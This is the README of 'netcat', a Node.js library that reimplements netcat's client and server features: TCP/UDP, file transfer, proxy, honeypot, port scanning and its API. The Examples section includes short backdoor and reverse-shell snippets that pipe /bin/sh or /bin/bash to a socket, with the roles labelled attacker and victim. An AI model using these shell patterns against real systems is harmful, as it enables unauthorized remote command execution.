# netcat

[![NPM Version](https://img.shields.io/npm/v/netcat.svg)](https://www.npmjs.com/package/netcat)
![node](https://img.shields.io/node/v/netcat.svg)
[![Dependency Status](https://david-dm.org/roccomuso/netcat.png)](https://david-dm.org/roccomuso/netcat)
[![JavaScript Style Guide](https://img.shields.io/badge/code_style-standard-brightgreen.svg)](https://standardjs.com)
<span class="badge-patreon"><a href="https://patreon.com/roccomuso" title="Donate to this project using Patreon"><img src="https://img.shields.io/badge/patreon-donate-yellow.svg" alt="Patreon donate button" /></a></span>

> Netcat client and server modules written in pure Javascript for Node.js.

Fully tested modules that implements all the basic netcat's features. To use as standalone tool install the [nc](https://github.com/roccomuso/nc) package.

| Linux/Mac | Windows |
|-----------|---------|
| [![Build Status](https://travis-ci.org/roccomuso/netcat.svg?branch=master)](https://travis-ci.org/roccomuso/netcat) | [![Build status](https://ci.appveyor.com/api/projects/status/q4x7xwtj7ga3ppo5?svg=true)](https://ci.appveyor.com/project/roccomuso/netcat) |

## What you can do :computer:

- [x] TCP & UDP
- [x] Backdoor (Reverse Shell)
- [x] Honeypot
- [x] File transfer
- [x] Port forwarding
- [x] Proxy
- [x] Web Server
- [x] Port scanning

## Enhancement

- [x] [Filter](#filter-incoming-data) incoming data.
- [ ] Crypto.
- [ ] Authentication (`.auth('pass')`).
- [ ] `allow` & `deny` specific remote IP-address.

## Install

    $ npm install --save netcat

[![NPM](https://nodei.co/npm/netcat.png?downloads=true&downloadRank=true)](https://nodei.co/npm/netcat/)

## Usage

```javascript
const NetcatServer = require('netcat/server')
const NetcatClient = require('netcat/client')
const nc = new NetcatServer()
const nc2 = new NetcatClient()
```

## Examples

This module's API tends to follow as much as possible the original netcat's cli params.

For instance: `nc -l -p 2389` is equivalent to `nc.port(2389).listen()`. Easy right?

#### Server and Client connection

| Server                 | Client                             |
|------------------------|------------------------------------|
|`nc.port(2389).listen()`|`nc2.addr('127.0.0.1').port(2389).connect()`|

#### Transfer file

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().pipe(outputStream)`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

or viceversa you can do the equivalent of `nc -l -p 2389 < filename.txt` and when someone else connects to your port 2389, the file is sent to them whether they wanted it or not:

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).serve('filename.txt').listen()`|`nc2.port(2389).connect().pipe(outputStream)`|

#### Keepalive connection

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).k().listen()`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

The server will be kept alive and not being closed after the first connection. (`k()` is an alias for `keepalive()`)

#### Serve raw buffer

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().serve(Buffer.from('Hello World'))`|`nc2.port(2389).connect().on('data', console.log)`|

#### Backdoor shell

| Server              | Client                             |
|---------------------|------------------------------------|
|`nc.port(2389).listen().exec('/bin/bash')`|`process.stdin.pipe( nc2.addr('127.0.0.1').port(2389).connect().pipe(process.stdout).stream() )`|

The `exec()` method execute the given command and pipe together his `stdout` and `stderr` with the clients `socket`.

#### Reverse shell

| Attacker              | Victim                           |
|---------------------|------------------------------------|
|`nc.k().port(2389).listen().serve(process.stdin).pipe(process.stdout)`|`nc2.addr('127.0.0.1').port(2389) .retry(5000).connect().exec('/bin/sh')`|

- [x] Upgradable to Meterpreter!

#### Netcat as a proxy

Netcat can be very easily configured as a proxy server:

```javascript
var nc = new NetcatServer()
var nc2 = new NetcatClient()
nc2.addr('google.com').port(80).connect()
nc.port(8080).k().listen().proxy(nc2.stream())
```

All the traffic flowing on `localhost:8080` will be redirected to `google.com:80`.
Similarly you can setup a port forwarding using the same host.

#### Honeypot

Pretend to be an Apache server:

```javascript
var apache = `HTTP/1.1 200 OK
Date: Sat, 27 May 2017 16:51:02 GMT
Server: Apache/2.4.7 (Ubuntu)
Cache-Control: public, max-age=0
Content-Type: text/html; charset=utf-8
Content-Length: 16894
Vary: Accept-Encoding
`
var nc = new NetcatServer()
var logFile = fs.createWriteStream('log.txt')
nc.port(80).k().listen().serve(Buffer.from(apache)).pipe(logFile)
```

#### Port scanning

The netcat client provides also a basic port scan functionality.

```javascript
var nc = new NetcatClient()
nc.addr('127.0.0.1').scan('22-80', function(ports){
 // ports: { '22': 'open', '23': 'closed' ... }
})
```

The port scanner is TCP protocol only. The UDP scan is not [really effective](https://en.wikipedia.org/wiki/Port_scanner#UDP_scanning). `scan(...)` accepts also an array or a integer number.

#### Filter incoming data

```javascript
var nc = new NetcatServer()
nc.addr('127.0.0.1').port(8080).filter(function (chunk, enc, cb) {
  // transform upper case
  var out = chunk.toString().toUpperCase()
  this.push(Buffer.from(out))
  cb(null)
}).pipe(process.stdout).connect()
```

#### Connect to a UNIX sock file

Both the Netcat server and client supports the UNIX socket conn.
Let's use our Netcat client instance to connect to the Docker unix socket file and retrieve the list of our containers' images.

```javascript
nc2.unixSocket('/var/run/docker.sock').enc('utf8')
  .on('data', function(res){
    console.log(res)
  })
  .connect()
  .send('GET /images/json HTTP/1.0\r\n\r\n')
```

#### UDP listen for packets

```javascript
var nc = new NetcatServer()
nc.udp().port(2100).listen().on('data', function (rinfo, data) {
  console.log('Got', data.toString(), 'from', rinfo.address, rinfo.port)
  nc.close()
})
```

#### UDP send a packet

```javascript
var nc2 = new NetcatClient()
nc2.udp().port(2100).wait(1000).init().send('hello', '127.0.0.1')
```

Send the `hello` buffer to port `2100`, then after `1000` ms close the client.

## API

#### `port(int)` or `p(int)`

Netcat can bind to any local port, subject to privilege restrictions and ports that are already in use.

#### `address(host)` or `addr(host)`

- When used server-side: set the local address to listen to. `0.0.0.0` by default.
- When used client-side: set the remote address to connect to. `127.0.0.1` by default.

#### `listen()`

Make the UDP/TCP server listen on the previously set port.

#### `unixSocket(path)` - TCP only

Optionally you can provide the path to a unix sock file and listen/connect to it.

#### `connect()` - TCP only

Client-side only. Let the client connect to the previously set address and port.

#### `retry(ms)` - TCP only

Client-side only. Retry connection every `ms` milliseconds when connection is lost.

#### `interval(ms)` or `i(ms)`

Client-side only: Specifies a delay time interval for data sent. In milliseconds.

#### `waitTime(ms)` or `wait(ms)`

Set a timeout.

- A server will wait `ms` milliseconds from the first data and if it doesn't get more data, will close the connection.
- A client will wait `ms` milliseconds from the first data sent and if there's no more data to send the client will close.

#### `stream()`

Return the client DuplexStream reference.

#### `pipe(outStream)`

Pipe incoming data from the client to the given outStream.

#### `filter(transformFn)`

Filter the incoming data with the given transform function `function (chunk, enc, cb){...}` before being piped out.

**NB**: The `.on('data', cb)` data you get is not filtered. The filter only applies on the piped `.pipe(...)` stream.

**Known issue**: `through2` right now [doesn't respect](https://github.com/roccomuso/netcat/issues/4) the encoding. If you set a filter you'll get a buffer and the `enc()` method will be useless.

#### `serve()`

Server-side method.

The `serve` method accepts either a string (indicating a file name, make sure the file exists), a Readable stream or a Buffer.
When you pass a readable stream the keepalive method could cause the stream to be consumed at the first request and no more can be served (The stream is not cached in a buffer).

Moreover when serving a file or a Buffer to a socket, the pipe will emit an `end` (EOF) event to the socket. Closing the stream.

#### `send(data [, cb|host])`

Client-side:

- in TCP: send data to the connected server. `cb` is called once the data is sent.
- in UDP: send data to the destination address or to the given host if provided.

Server-side:

- in TCP: not available in tcp, use `serve()` instead.
- in UDP: send data to the destination address or to the given host if provided.

#### `end(data)` - TCP only

Client-side method. Send given data and close the connection.

#### `close([cb])`

Close the connection (or the connections if executed server-side) and call `cb` once the socket is closed.

#### `enc()`

Set an encoding. The most common ones are: `utf8`, `ascii`, `base64`, `hex`, `binary`, `hex`.

#### `protocol(prot)`

Set a custom protocol. The use of this method is discouraged. Use the methods `tcp()` and `udp()` instead. `tcp` is the default value.

#### `keepalive()` or `k()` - TCP only

Server-side method.

When you set the keepalive, the server will stay up and possibly the outStream given to `pipe(outStream)` kept open.

By default in UDP mode the listen is kept alive until an explicit `nc.close()`.

#### `exec()` - TCP only

The `exec()` method execute the given command and pipe together his `stdout` and `stderr` with the clients `socket`. It optionally accepts a string and an array of args as second param and the [spawn options](https://nodejs.org/api/child_process.html#child_process_child_process_spawn_command_args_options) as third param. If a pipe char is found `|` then all the commands will be processed under a `sh -c`.

Example:

```javascript
nc.p(2389).exec('base64', ['-d']).listen()
// OR
nc.p(2389).exec('base64 | grep hello').listen()
```

#### `getClients()` - TCP only

Server-side method. Return an object listing all the client socket references.

#### `proxy(duplexStream)` - TCP only

Server-side method. This method pipe the server incoming/outcoming data to the provided duplexStream. It's like a shortcut for both the calls: `.serve(duplexStream)` and `.pipe(duplexStream)`.

#### `output(outStream)` or `out(outStream)`

Write an Hex dump of incoming or outcoming traffic to the given writable stream `outStream`.

A row represent a chunk of at least 16 bytes by default.

The first character can be either `<` or `>` respectively "incoming chunk" or "outcoming chunk".

#### `scan(portsInterval, cb)` - TCP only

The netcat client provides also a basic port scan functionality.

The parameters are mandatories.
The first parameter specify the port/s to scan.
It can be a single integer, a string interval (like `22-80`) or an array of integer (`[22, 23, 1880]`).
The callback return as a result an object like `{ '22': 'open', '23': 'closed' ... }`.

#### `init()` - UDP only

The UDP-equivalent of `connect()`. Just for UDP clients.

#### `bind(<int>)` - UDP only

Let the UDP client/server listen on the given port. It will also be used as outcoming port if `.port(<n>)` wasn't called.

#### `broadcast(<dst>)` or `b(<dst>)` - UDP only

Set broadcast for the UDP server (eventually you can specify a destination address).

#### `destination(<dst>)` - UDP only

Set a destination address. (`127.0.0.1` is the default value)

#### `loopback()` - UDP only

Enable loopback. For instance, when a UDP server is binded to a port and send a message to that port, it will get back the msg if loopback is enabled.

#### `bind(int)` - UDP only

Bind the UDP Server/Client to listen on the given port and use the port set with `port()` only for outcoming packets.

## Events

The netcat modules extends the `EventEmitter` class. You'll be able to catch some events straight from the sockets. For example the `data` event for the server:

| Server              | Client                    |
|---------------------|------------------------------------|
|`nc.port(2389).listen().on('data', onData)`|`inputStream.pipe(nc2.port(2389).connect().stream())`|

```javascript
function onData (socket, chunk) {
  console.log(socket.id, 'got', chunk) // Buffer <...>
  socket.write('hello client') // reply to the client
}
```

### Server events

- `.on('data', function(sock/rinfo, msg){})`

Emitted when the server gets data from the clients.

- `.on('ready', cb)`

Emitted when the server successfully listen/bind to a port.

- `.on('close', cb)`

Emitted when the server close.

- `.on('clientClose', function(socket, hadError){})` - **TCP only**

Called when a client disconnects from the server.
The callback accepts as 1th param the `socket` instance just disconnected and a bool val `hadError`.

- `.on('connection', function(socket){})` - **TCP only**

Emitted when a new client connects to the server.

- `.on('end', function(socket){})` - **TCP only**

Emitted when a client end the connection.

- `.on('timeout', function(socket){})` - **TCP only**

Socket timeout event.

- `.on('waitTimeout', cb)`

Fired when the server remains inactive for a specified `wait(ms)` time.

- `.on('error', function(err){})`

Emitted on error.

### Client events

- `.on('data', function(msg){})`

Data from the server.

- `.on('close', cb)`

Emitted when the client close.

- `.on('waitTimeout', cb)`

Fired when the client remains inactive for a specified `wait(ms)` time.

- `.on('connect', cb)` - **TCP only**

Emitted when the client established a connection with a server.

- `.on('error', function(err){})`

Emitted on error.

## CLI usage

For the standalone usage install the [nc](https://github.com/roccomuso/nc) CLI package:

    $ npm install -g nc

Example:

    $ # Listen for inbound
    $ nc -l -p port [- options] [hostname] [port]


Available options:


- [x] `-c shell commands    as '-e'; use /bin/sh to exec [dangerous!!]`
- [x] `-e filename          program to exec after connect [dangerous!!]`
- [x] `-b                   allow broadcasts`
- [x] `-i secs              delay interval for lines sent, ports scanned (client-side)`
- [x] `-h                   this cruft`
- [x] `-k set               keepalive option on socket`
- [x] `-l                   listen mode, for inbound connects`
- [ ] `-n                   numeric-only IP addresses, no DNS`
- [x] `-o file              hex dump of traffic`
- [x] `-p port              local port number`
- [ ] `-r                   randomize local and remote ports`
- [ ] `-q secs              quit after EOF on stdin and delay of secs`
- [x] `-s addr              local source address`
- [x] `-u                   UDP mode`
- [x] `-U                   Listen or connect to a UNIX domain socket`
- [x] `-v                   verbose`
- [x] `-w secs              timeout for connects and final net reads`
- [x] `-z                   zero-I/O mode [used for scanning]`


## DEBUG

Debug matches the verbose mode.
You can enable it with the `verbose: true` param or the env var `DEBUG=netcat:*`

## Tests

Run them with: `npm test`

Coverage:

- [x] Test the `.serve(input)` method
- [x] Tests the keepalive connection with `.pipe()` and `serve()`.
- [x] serve can accepts both a string or a stream.
- [x] `exec()` method
- [x] Backdoor shell
- [x] Proxy server
- [x] UDP.

## Author

Rocco Musolino ([@roccomuso](https://twitter.com/roccomuso))

## License

MIT
